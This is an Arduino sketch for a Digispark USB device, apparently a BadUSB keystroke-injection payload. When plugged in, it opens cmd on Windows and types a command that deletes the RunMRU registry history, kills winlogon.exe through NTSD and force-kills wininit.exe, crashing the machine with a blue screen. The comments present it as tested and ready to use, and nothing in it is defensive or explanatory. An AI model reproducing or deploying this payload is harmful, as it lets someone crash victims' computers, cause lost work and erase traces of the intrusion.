//This DigiKeyboard performance a blue screen through Windows CMD
//on Windows 7 and Windows XP. It has been tested successfully

#include "DigiKeyboard.h"

void setup() 
{
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(200);
  //open cmd
  DigiKeyboard.println("CMD /C START /MIN CMD /C REG DELETE hkcu\\sOFTWARE\\mICROSOFT\\wINDOWS\\cURRENTvERSION\\eXPLORER\\rUNmru /F&CMD /C START /MIN CMD /C NTSD -C Q -PN WINLOGON.EXE 1>NUL 2>NUL&TASKKILL /F /IM WININIT.EXE 2>NUL");
}

void loop()
{
  //empty
}
